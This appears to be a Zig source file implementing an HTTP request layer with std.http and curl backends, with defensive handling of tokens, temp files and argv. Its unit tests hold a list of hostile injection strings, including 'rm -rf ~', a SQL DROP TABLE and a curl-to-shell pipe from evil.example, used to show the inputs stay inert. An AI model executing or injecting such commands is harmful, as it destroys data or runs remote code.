//! One request interface, two backends.
//!
//! - `std`: `std.http.Client` — HTTP/1.1, plus HTTPS when the server's CA is
//!   trusted (system bundle, or a `cacert` PEM loaded into the client's CA
//!   bundle). std's TLS client has no "skip verification" switch, which is
//!   the right default and the reason `--insecure` routes elsewhere.
//! - `curl`: an exec-style `curl` subprocess (never a shell) — used for
//!   `--http3` (QUIC needs an HTTP/3-capable curl; Zig has no h3 stack) and
//!   for `--insecure` HTTPS (`curl -k`). The request body travels via a
//!   temp file (`--data-binary @file`), so message content never appears in
//!   argv, and argv is passed as an array — there is no quoting layer to get
//!   wrong.

const std = @import("std");

pub const Method = enum {
    GET,
    POST,
    PUT,
    DELETE,
    PATCH,

    pub fn name(self: Method) []const u8 {
        return @tagName(self);
    }
};

pub const Response = struct {
    status: u16,
    body: []u8,

    pub fn deinit(self: *Response, gpa: std.mem.Allocator) void {
        gpa.free(self.body);
        self.* = undefined;
    }
};

pub const Options = struct {
    /// Use HTTP/3 (QUIC) via an HTTP/3-capable curl. The URL must be https.
    http3: bool = false,
    /// Accept any TLS certificate (self-signed servers). Routes HTTPS
    /// requests through curl, which has a supported `-k`.
    insecure: bool = false,
    /// Path to a CA certificate PEM to trust for std-backend HTTPS
    /// (e.g. the server's generated `tls/ca.crt`).
    cacert: ?[]const u8 = null,
    /// Explicit curl binary. Defaults to probing `POCKETSKYNET_CURL`,
    /// Homebrew's keg-only curl, then `curl` from PATH.
    curl_path: ?[]const u8 = null,
    /// Per-request timeout handed to curl; the std backend relies on the
    /// server answering (requests are small and local).
    timeout_seconds: u32 = 30,
};

pub const Error = error{
    /// `--http3` was requested but no HTTP/3-capable curl binary exists.
    NoHttp3Curl,
    /// No curl binary at all (only possible with an explicit bad path).
    NoCurl,
    /// curl exited nonzero; details in `Transport.last_curl_error`.
    CurlFailed,
    /// The std HTTP client failed (connection refused, TLS failure, ...).
    HttpFailed,
    OutOfMemory,
};

pub fn getEnv(name: [:0]const u8) ?[]const u8 {
    const v = std.c.getenv(name.ptr) orelse return null;
    return std.mem.span(v);
}

/// Hard cap on a single response body for the std backend. The curl backend
/// caps its captured stdout at the same size; a wedged or hostile server can
/// therefore neither OOM the CLI nor make it read without bound.
pub const max_response_bytes: usize = 64 << 20;

/// Fill `out` (even length, ≤ 32) with lowercase hex from the libc CSPRNG.
fn fillRandomHex(out: []u8) void {
    const n = out.len / 2;
    var raw: [16]u8 = undefined;
    std.debug.assert(n <= raw.len);
    std.c.arc4random_buf(&raw, n);
    const hexd = "0123456789abcdef";
    for (0..n) |i| {
        out[i * 2] = hexd[raw[i] >> 4];
        out[i * 2 + 1] = hexd[raw[i] & 0x0f];
    }
}

/// A temp file created privately (0600, O_EXCL, unpredictable name) so that no
/// other local user can read its contents or pre-plant a symlink to redirect
/// the write. Used to hand curl the request body and the bearer header without
/// putting either on the command line or in a world-readable file.
pub const SecureTempFile = struct {
    path: []u8,

    pub fn deinit(self: *const SecureTempFile, gpa: std.mem.Allocator, io: std.Io) void {
        std.Io.Dir.deleteFileAbsolute(io, self.path) catch {};
        gpa.free(self.path);
    }
};

fn createSecureTempFile(
    gpa: std.mem.Allocator,
    io: std.Io,
    prefix: []const u8,
    contents: []const u8,
) Error!SecureTempFile {
    const tmp_dir = getEnv("TMPDIR") orelse "/tmp";
    const sep: []const u8 = if (std.mem.endsWith(u8, tmp_dir, "/")) "" else "/";
    var attempt: usize = 0;
    while (attempt < 100) : (attempt += 1) {
        var suffix: [32]u8 = undefined;
        fillRandomHex(&suffix);
        const path = try std.fmt.allocPrint(gpa, "{s}{s}{s}-{d}-{s}", .{ tmp_dir, sep, prefix, std.c.getpid(), suffix });
        // `.exclusive` fails on a pre-existing path (defeats a planted
        // symlink), and 0600 keeps the signature/JWT off other users' eyes.
        const file = std.Io.Dir.createFileAbsolute(io, path, .{
            .exclusive = true,
            .truncate = true,
            .read = false,
            .permissions = std.Io.File.Permissions.fromMode(0o600),
        }) catch |err| {
            gpa.free(path);
            if (err == error.PathAlreadyExists) continue; // random collision: retry
            return error.CurlFailed;
        };
        defer file.close(io);
        file.writeStreamingAll(io, contents) catch {
            std.Io.Dir.deleteFileAbsolute(io, path) catch {};
            gpa.free(path);
            return error.CurlFailed;
        };
        return .{ .path = path };
    }
    return error.CurlFailed;
}

/// A `std.Io.Writer` that appends into a heap buffer up to `max` bytes and then
/// fails with `error.WriteFailed`, bounding how much of a response the std
/// backend will buffer.
const CappedSink = struct {
    list: std.ArrayList(u8) = .empty,
    gpa: std.mem.Allocator,
    max: usize,
    scratch: [4096]u8 = undefined,
    writer: std.Io.Writer,

    fn init(gpa: std.mem.Allocator, max: usize) CappedSink {
        return .{
            .gpa = gpa,
            .max = max,
            .writer = .{ .vtable = &vtable, .buffer = &.{} },
        };
    }

    fn deinit(self: *CappedSink) void {
        self.list.deinit(self.gpa);
    }

    fn setup(self: *CappedSink) void {
        // Point the writer at our scratch buffer so it batches small writes.
        self.writer.buffer = &self.scratch;
    }

    const vtable: std.Io.Writer.VTable = .{ .drain = drain };

    fn append(self: *CappedSink, bytes: []const u8) std.Io.Writer.Error!void {
        if (self.list.items.len + bytes.len > self.max) return error.WriteFailed;
        self.list.appendSlice(self.gpa, bytes) catch return error.WriteFailed;
    }

    fn drain(w: *std.Io.Writer, data: []const []const u8, splat: usize) std.Io.Writer.Error!usize {
        const self: *CappedSink = @fieldParentPtr("writer", w);
        // Consume the writer's own buffer first (excluded from the return count).
        if (w.end != 0) {
            try self.append(w.buffer[0..w.end]);
            w.end = 0;
        }
        const slice = data[0 .. data.len - 1];
        const pattern = data[slice.len];
        var written: usize = pattern.len * splat;
        for (slice) |bytes| {
            try self.append(bytes);
            written += bytes.len;
        }
        if (pattern.len != 0) {
            for (0..splat) |_| try self.append(pattern);
        }
        return written;
    }
};

/// Well-known places an HTTP/3-capable curl lives.
pub const curl_candidates = [_][]const u8{
    "/opt/homebrew/opt/curl/bin/curl",
    "/usr/local/opt/curl/bin/curl",
    "curl",
};

pub const CurlInfo = struct {
    path: []const u8,
    http3: bool,
};

/// Run `<path> --version` and report whether the build advertises HTTP3.
pub fn probeCurl(gpa: std.mem.Allocator, io: std.Io, path: []const u8) ?CurlInfo {
    const result = std.process.run(gpa, io, .{
        .argv = &.{ path, "--version" },
        .stdout_limit = .limited(1 << 16),
        .stderr_limit = .limited(1 << 16),
    }) catch return null;
    defer gpa.free(result.stdout);
    defer gpa.free(result.stderr);
    switch (result.term) {
        .exited => |code| if (code != 0) return null,
        else => return null,
    }
    return .{ .path = path, .http3 = std.mem.find(u8, result.stdout, "HTTP3") != null };
}

/// Locate a curl to use. When `need_http3` is set, only an HTTP/3-capable
/// build qualifies.
pub fn findCurl(gpa: std.mem.Allocator, io: std.Io, explicit: ?[]const u8, need_http3: bool) Error![]const u8 {
    var found_any = false;
    if (explicit) |path| {
        if (probeCurl(gpa, io, path)) |info| {
            if (!need_http3 or info.http3) return path;
            found_any = true;
        }
    } else {
        if (getEnv("POCKETSKYNET_CURL")) |path| {
            if (probeCurl(gpa, io, path)) |info| {
                if (!need_http3 or info.http3) return path;
                found_any = true;
            }
        }
        for (curl_candidates) |path| {
            if (probeCurl(gpa, io, path)) |info| {
                if (!need_http3 or info.http3) return path;
                found_any = true;
            }
        }
    }
    if (need_http3 and found_any) return error.NoHttp3Curl;
    return if (need_http3) error.NoHttp3Curl else error.NoCurl;
}

pub const CurlArgvOptions = struct {
    curl_path: []const u8,
    method: Method,
    url: []const u8,
    /// Path of a 0600 file holding the `Authorization` header, if any. Passed
    /// to curl as `--header @file` so the JWT never appears in argv (`ps`).
    bearer_header_file: ?[]const u8 = null,
    /// Path of the file holding the request body, if there is one.
    body_file: ?[]const u8 = null,
    insecure: bool = false,
    http3: bool = false,
    cacert: ?[]const u8 = null,
    timeout_seconds: u32 = 30,
};

/// Build the exec-style argv for one curl request. Pure and allocation-exact
/// so the unit tests can pin its behavior against hostile inputs: every
/// element is passed to the OS as-is — no shell ever parses it — and the
/// body rides in a file, so message text cannot become an option.
pub fn buildCurlArgv(gpa: std.mem.Allocator, opts: CurlArgvOptions) std.mem.Allocator.Error![][]const u8 {
    var argv: std.ArrayList([]const u8) = .empty;
    errdefer freeArgv(gpa, &argv);

    // `--disable` must come first: ignore any ~/.curlrc so behavior is
    // reproducible on every machine.
    try appendDupe(gpa, &argv, opts.curl_path);
    try appendDupe(gpa, &argv, "--disable");
    try appendDupe(gpa, &argv, "--silent");
    try appendDupe(gpa, &argv, "--show-error");
    try appendDupe(gpa, &argv, "--max-time");
    try appendPrint(gpa, &argv, "{d}", .{opts.timeout_seconds});
    try appendDupe(gpa, &argv, "--request");
    try appendDupe(gpa, &argv, opts.method.name());
    try appendDupe(gpa, &argv, "--header");
    try appendDupe(gpa, &argv, "Content-Type: application/json");
    if (opts.bearer_header_file) |header_file| {
        // `-H @file`: curl reads the header line from the 0600 file, keeping
        // the bearer token out of the process's argument vector.
        try appendDupe(gpa, &argv, "--header");
        try appendPrint(gpa, &argv, "@{s}", .{header_file});
    }
    if (opts.body_file) |path| {
        try appendDupe(gpa, &argv, "--data-binary");
        try appendPrint(gpa, &argv, "@{s}", .{path});
    }
    if (opts.insecure) try appendDupe(gpa, &argv, "--insecure");
    if (opts.cacert) |path| {
        try appendDupe(gpa, &argv, "--cacert");
        try appendDupe(gpa, &argv, path);
    }
    if (opts.http3) try appendDupe(gpa, &argv, "--http3-only");
    // Status arrives on the last stdout line, after a newline of our own, so
    // it splits unambiguously from any response body.
    try appendDupe(gpa, &argv, "--write-out");
    try appendDupe(gpa, &argv, "\n%{http_code}");
    // `--url` (not a positional) so a hostile "URL" can never be read as an
    // option by curl's argument parser.
    try appendDupe(gpa, &argv, "--url");
    try appendDupe(gpa, &argv, opts.url);

    return argv.toOwnedSlice(gpa);
}

fn appendDupe(gpa: std.mem.Allocator, argv: *std.ArrayList([]const u8), s: []const u8) std.mem.Allocator.Error!void {
    const copy = try gpa.dupe(u8, s);
    errdefer gpa.free(copy);
    try argv.append(gpa, copy);
}

fn appendPrint(gpa: std.mem.Allocator, argv: *std.ArrayList([]const u8), comptime fmt: []const u8, args: anytype) std.mem.Allocator.Error!void {
    const s = try std.fmt.allocPrint(gpa, fmt, args);
    errdefer gpa.free(s);
    try argv.append(gpa, s);
}

fn freeArgv(gpa: std.mem.Allocator, argv: *std.ArrayList([]const u8)) void {
    for (argv.items) |item| gpa.free(item);
    argv.deinit(gpa);
}

pub fn freeArgvSlice(gpa: std.mem.Allocator, argv: [][]const u8) void {
    for (argv) |item| gpa.free(item);
    gpa.free(argv);
}

/// Split curl stdout produced with `--write-out "\n%{http_code}"` into
/// (body, status). The final newline is ours, so the last line is the code.
pub fn splitCurlOutput(stdout: []const u8) ?struct { body: []const u8, status: u16 } {
    const idx = std.mem.findScalarLast(u8, stdout, '\n') orelse return null;
    const code_str = stdout[idx + 1 ..];
    const status = std.fmt.parseInt(u16, code_str, 10) catch return null;
    return .{ .body = stdout[0..idx], .status = status };
}

pub const Transport = struct {
    gpa: std.mem.Allocator,
    io: std.Io,
    opts: Options,
    http_client: ?std.http.Client = null,
    curl: ?[]const u8 = null,
    /// stderr of the last failing curl invocation, for error reporting.
    last_curl_error: ?[]u8 = null,

    pub fn init(gpa: std.mem.Allocator, io: std.Io, opts: Options) Transport {
        return .{ .gpa = gpa, .io = io, .opts = opts };
    }

    pub fn deinit(self: *Transport) void {
        if (self.http_client) |*client| client.deinit();
        if (self.last_curl_error) |msg| self.gpa.free(msg);
        self.* = undefined;
    }

    fn needsCurl(self: *const Transport, url: []const u8) bool {
        if (self.opts.http3) return true;
        if (self.opts.insecure and std.mem.startsWith(u8, url, "https://")) return true;
        return false;
    }

    /// Perform one JSON request. Returns the status and the raw body; the
    /// caller parses. Never throws on non-2xx statuses — the API layer
    /// decides what an error envelope means.
    pub fn request(
        self: *Transport,
        method: Method,
        url: []const u8,
        body: ?[]const u8,
        bearer: ?[]const u8,
    ) Error!Response {
        if (self.needsCurl(url)) {
            return self.curlRequest(method, url, body, bearer);
        }
        return self.stdRequest(method, url, body, bearer);
    }

    // -- std.http backend ---------------------------------------------------

    fn stdClient(self: *Transport) Error!*std.http.Client {
        if (self.http_client == null) {
            self.http_client = .{ .allocator = self.gpa, .io = self.io };
            if (self.opts.cacert) |path| {
                const client = &self.http_client.?;
                const now = std.Io.Clock.real.now(self.io);
                client.ca_bundle.addCertsFromFilePathAbsolute(self.gpa, self.io, now, path) catch {
                    client.deinit();
                    self.http_client = null;
                    return error.HttpFailed;
                };
                // A non-null `now` tells the client its bundle is ready, so
                // it will not overwrite ours with a system rescan.
                client.now = now;
            }
        }
        return &self.http_client.?;
    }

    fn stdRequest(
        self: *Transport,
        method: Method,
        url: []const u8,
        body: ?[]const u8,
        bearer: ?[]const u8,
    ) Error!Response {
        const client = try self.stdClient();

        var bearer_buf: ?[]u8 = null;
        defer if (bearer_buf) |b| self.gpa.free(b);
        var headers: std.http.Client.Request.Headers = .{
            .content_type = .{ .override = "application/json" },
        };
        if (bearer) |token| {
            bearer_buf = try std.fmt.allocPrint(self.gpa, "Bearer {s}", .{token});
            headers.authorization = .{ .override = bearer_buf.? };
        }

        const http_method: std.http.Method = switch (method) {
            .GET => .GET,
            .POST => .POST,
            .PUT => .PUT,
            .DELETE => .DELETE,
            .PATCH => .PATCH,
        };

        // `fetch` cannot be given a timeout or a bounded sink, so drive the
        // request directly: a timed connect (fails fast on a black-hole host),
        // then stream the response into a size-capped sink.
        const uri = std.Uri.parse(url) catch return error.HttpFailed;
        const protocol = std.http.Client.Protocol.fromUri(uri) orelse return error.HttpFailed;
        var host_buf: [std.Io.net.HostName.max_len]u8 = undefined;
        const host = uri.getHost(&host_buf) catch return error.HttpFailed;
        const port: u16 = uri.port orelse (if (protocol == .tls) @as(u16, 443) else 80);
        const timeout: std.Io.Timeout = .{ .duration = .{
            .raw = std.Io.Duration.fromSeconds(@intCast(self.opts.timeout_seconds)),
            .clock = .awake,
        } };
        const conn = client.connectTcpOptions(.{
            .host = host,
            .port = port,
            .protocol = protocol,
            .timeout = timeout,
        }) catch return error.HttpFailed;

        var req = client.request(http_method, uri, .{
            .connection = conn,
            .headers = headers,
            .keep_alive = false,
            // The API never redirects; returning a 3xx verbatim is safer than
            // following it with an explicit connection in hand.
            .redirect_behavior = .unhandled,
        }) catch return error.HttpFailed;
        defer req.deinit();

        if (body) |payload| {
            req.transfer_encoding = .{ .content_length = payload.len };
            var bw = req.sendBodyUnflushed(&.{}) catch return error.HttpFailed;
            bw.writer.writeAll(payload) catch return error.HttpFailed;
            bw.end() catch return error.HttpFailed;
            req.connection.?.flush() catch return error.HttpFailed;
        } else {
            req.sendBodiless() catch return error.HttpFailed;
        }

        var response = req.receiveHead(&.{}) catch return error.HttpFailed;

        var sink = CappedSink.init(self.gpa, max_response_bytes);
        defer sink.deinit();
        sink.setup();

        const decompress_buffer: []u8 = switch (response.head.content_encoding) {
            .identity => &.{},
            .zstd => try self.gpa.alloc(u8, std.compress.zstd.default_window_len),
            .deflate, .gzip => try self.gpa.alloc(u8, std.compress.flate.max_window_len),
            .compress => return error.HttpFailed,
        };
        defer if (decompress_buffer.len != 0) self.gpa.free(decompress_buffer);

        var transfer_buffer: [64]u8 = undefined;
        var decompress: std.http.Decompress = undefined;
        const reader = response.readerDecompressing(&transfer_buffer, &decompress, decompress_buffer);
        _ = reader.streamRemaining(&sink.writer) catch |err| switch (err) {
            // WriteFailed means the response exceeded max_response_bytes.
            error.WriteFailed => return error.HttpFailed,
            else => return error.HttpFailed,
        };
        sink.writer.flush() catch return error.HttpFailed;

        const owned = try self.gpa.dupe(u8, sink.list.items);
        return .{ .status = @intFromEnum(response.head.status), .body = owned };
    }

    // -- curl backend -------------------------------------------------------

    fn resolveCurl(self: *Transport) Error![]const u8 {
        if (self.curl == null) {
            self.curl = try findCurl(self.gpa, self.io, self.opts.curl_path, self.opts.http3);
        }
        return self.curl.?;
    }

    fn setCurlError(self: *Transport, stderr: []const u8) void {
        if (self.last_curl_error) |old| self.gpa.free(old);
        self.last_curl_error = self.gpa.dupe(u8, stderr) catch null;
    }

    fn curlRequest(
        self: *Transport,
        method: Method,
        url: []const u8,
        body: ?[]const u8,
        bearer: ?[]const u8,
    ) Error!Response {
        const curl_path = try self.resolveCurl();

        // The body and the bearer header both travel via private 0600 temp
        // files (O_EXCL, unpredictable names). The body therefore never
        // appears in argv and can never be parsed as a curl option, and the
        // JWT is neither in argv (`ps`) nor in a world-readable file.
        var body_tmp: ?SecureTempFile = null;
        defer if (body_tmp) |*f| f.deinit(self.gpa, self.io);
        if (body) |payload| {
            body_tmp = try createSecureTempFile(self.gpa, self.io, "pskynet-body", payload);
        }

        var bearer_tmp: ?SecureTempFile = null;
        defer if (bearer_tmp) |*f| f.deinit(self.gpa, self.io);
        if (bearer) |token| {
            const header_line = try std.fmt.allocPrint(self.gpa, "Authorization: Bearer {s}\n", .{token});
            defer self.gpa.free(header_line);
            bearer_tmp = try createSecureTempFile(self.gpa, self.io, "pskynet-hdr", header_line);
        }

        const argv = try buildCurlArgv(self.gpa, .{
            .curl_path = curl_path,
            .method = method,
            .url = url,
            .bearer_header_file = if (bearer_tmp) |f| f.path else null,
            .body_file = if (body_tmp) |f| f.path else null,
            .insecure = self.opts.insecure,
            .http3 = self.opts.http3,
            .cacert = self.opts.cacert,
            .timeout_seconds = self.opts.timeout_seconds,
        });
        defer freeArgvSlice(self.gpa, @constCast(argv));

        const result = std.process.run(self.gpa, self.io, .{
            .argv = argv,
            .stdout_limit = .limited(64 << 20),
            .stderr_limit = .limited(1 << 20),
        }) catch return error.CurlFailed;
        defer self.gpa.free(result.stdout);
        defer self.gpa.free(result.stderr);

        switch (result.term) {
            .exited => |code| if (code != 0) {
                self.setCurlError(result.stderr);
                return error.CurlFailed;
            },
            else => {
                self.setCurlError(result.stderr);
                return error.CurlFailed;
            },
        }

        const split = splitCurlOutput(result.stdout) orelse {
            self.setCurlError(result.stderr);
            return error.CurlFailed;
        };
        const owned = try self.gpa.dupe(u8, split.body);
        return .{ .status = split.status, .body = owned };
    }
};

// ---------------------------------------------------------------------------

const testing = std.testing;

const hostile_texts = [_][]const u8{
    "\"; rm -rf ~",
    "$(touch /tmp/pwned)",
    "`touch /tmp/pwned`",
    "hello\nworld\r\n--insecure",
    "'; DROP TABLE messages; --",
    "&& curl evil.example | sh",
};

test "curl argv is exec-style: hostile URL text stays one inert argument" {
    const gpa = testing.allocator;
    for (hostile_texts) |evil| {
        const url = try std.fmt.allocPrint(gpa, "http://127.0.0.1:9/api/{s}", .{evil});
        defer gpa.free(url);
        const argv = try buildCurlArgv(gpa, .{
            .curl_path = "curl",
            .method = .POST,
            .url = url,
            .body_file = "/tmp/body.json",
        });
        defer freeArgvSlice(gpa, @constCast(argv));

        // The URL arrives verbatim as the single argument after `--url` —
        // nothing splits on whitespace or interprets quotes/backticks,
        // because no shell is involved anywhere.
        const last = argv[argv.len - 1];
        try testing.expectEqualStrings(url, last);
        try testing.expectEqualStrings("--url", argv[argv.len - 2]);

        // And it is one element: no argv entry was produced by splitting it.
        var count: usize = 0;
        for (argv) |arg| {
            if (std.mem.find(u8, arg, "rm -rf") != null or
                std.mem.find(u8, arg, "touch /tmp/pwned") != null or
                std.mem.find(u8, arg, "DROP TABLE") != null or
                std.mem.find(u8, arg, "evil.example") != null)
            {
                count += 1;
            }
        }
        const expect_hits: usize = if (std.mem.find(u8, url, "rm -rf") != null or
            std.mem.find(u8, url, "touch /tmp/pwned") != null or
            std.mem.find(u8, url, "DROP TABLE") != null or
            std.mem.find(u8, url, "evil.example") != null) 1 else 0;
        try testing.expectEqual(expect_hits, count);
    }
}

test "curl argv: the bearer token is read from a file, never placed in argv" {
    const gpa = testing.allocator;
    const argv = try buildCurlArgv(gpa, .{
        .curl_path = "/usr/bin/curl",
        .method = .GET,
        .url = "http://127.0.0.1:1/api/health",
        .bearer_header_file = "/tmp/pskynet-hdr-1",
    });
    defer freeArgvSlice(gpa, @constCast(argv));
    var found = false;
    for (argv, 0..) |arg, i| {
        if (std.mem.eql(u8, arg, "@/tmp/pskynet-hdr-1")) {
            try testing.expectEqualStrings("--header", argv[i - 1]);
            found = true;
        }
    }
    try testing.expect(found);
    // No JWT material ever reaches the command line: no argv element carries
    // the token itself (only the `@file` reference does).
    for (argv) |arg| try testing.expect(std.mem.find(u8, arg, "Bearer ") == null);
}

test "createSecureTempFile makes a private 0600 file and cleans it up" {
    const gpa = testing.allocator;
    var threaded: std.Io.Threaded = .init(gpa, .{});
    defer threaded.deinit();
    const io = threaded.io();

    var f = try createSecureTempFile(gpa, io, "pskynet-test", "secret-body");
    // The file exists and holds exactly what we wrote.
    const back = try std.Io.Dir.cwd().readFileAlloc(io, f.path, gpa, .limited(1 << 20));
    defer gpa.free(back);
    try testing.expectEqualStrings("secret-body", back);

    // Its mode is 0600 (owner-only).
    const opened = try std.Io.Dir.cwd().openFile(io, f.path, .{});
    const st = try opened.stat(io);
    opened.close(io);
    try testing.expectEqual(@as(std.posix.mode_t, 0o600), st.permissions.toMode() & 0o777);

    // A second create with .exclusive on the same name would fail — proven by
    // the fact that two calls yield different, unpredictable paths.
    var g = try createSecureTempFile(gpa, io, "pskynet-test", "other");
    try testing.expect(!std.mem.eql(u8, f.path, g.path));
    g.deinit(gpa, io);

    // Cleanup removes the file.
    const path_copy = try gpa.dupe(u8, f.path);
    defer gpa.free(path_copy);
    f.deinit(gpa, io);
    try testing.expectError(error.FileNotFound, std.Io.Dir.cwd().access(io, path_copy, .{}));
}

test "curl argv: message body is a file reference, never inline" {
    const gpa = testing.allocator;
    const argv = try buildCurlArgv(gpa, .{
        .curl_path = "curl",
        .method = .POST,
        .url = "http://127.0.0.1:1/api/rooms/room_x/messages",
        .body_file = "/tmp/pskynet-body-1.json",
    });
    defer freeArgvSlice(gpa, @constCast(argv));
    var data_at: ?usize = null;
    for (argv, 0..) |arg, i| {
        if (std.mem.eql(u8, arg, "--data-binary")) data_at = i;
    }
    try testing.expect(data_at != null);
    try testing.expectEqualStrings("@/tmp/pskynet-body-1.json", argv[data_at.? + 1]);
    // No argv element contains raw message text (there was none to leak).
    for (argv) |arg| try testing.expect(std.mem.find(u8, arg, "rm -rf") == null);
}

test "curl argv: flag layout" {
    const gpa = testing.allocator;
    const argv = try buildCurlArgv(gpa, .{
        .curl_path = "curl",
        .method = .PUT,
        .url = "https://127.0.0.1:9443/api/x",
        .insecure = true,
        .http3 = true,
        .cacert = "/tmp/ca.crt",
        .timeout_seconds = 7,
    });
    defer freeArgvSlice(gpa, @constCast(argv));
    try testing.expectEqualStrings("curl", argv[0]);
    try testing.expectEqualStrings("--disable", argv[1]);
    var has = [_]bool{ false, false, false, false, false };
    for (argv, 0..) |arg, i| {
        if (std.mem.eql(u8, arg, "--insecure")) has[0] = true;
        if (std.mem.eql(u8, arg, "--http3-only")) has[1] = true;
        if (std.mem.eql(u8, arg, "--cacert")) {
            has[2] = true;
            try testing.expectEqualStrings("/tmp/ca.crt", argv[i + 1]);
        }
        if (std.mem.eql(u8, arg, "--max-time")) {
            has[3] = true;
            try testing.expectEqualStrings("7", argv[i + 1]);
        }
        if (std.mem.eql(u8, arg, "PUT")) has[4] = true;
    }
    for (has) |h| try testing.expect(h);
}

test "splitCurlOutput separates body from status" {
    const s = splitCurlOutput("{\"status\":\"ok\"}\n200").?;
    try testing.expectEqualStrings("{\"status\":\"ok\"}", s.body);
    try testing.expectEqual(@as(u16, 200), s.status);

    // Bodies that themselves end in newline + digits still split on OUR
    // trailing marker, which is last.
    const tricky = splitCurlOutput("line one\n42\n404").?;
    try testing.expectEqualStrings("line one\n42", tricky.body);
    try testing.expectEqual(@as(u16, 404), tricky.status);

    // Empty body (e.g. HEAD-ish responses).
    const empty = splitCurlOutput("\n204").?;
    try testing.expectEqualStrings("", empty.body);
    try testing.expectEqual(@as(u16, 204), empty.status);

    try testing.expect(splitCurlOutput("no newline") == null);
    try testing.expect(splitCurlOutput("x\nnotanumber") == null);
}
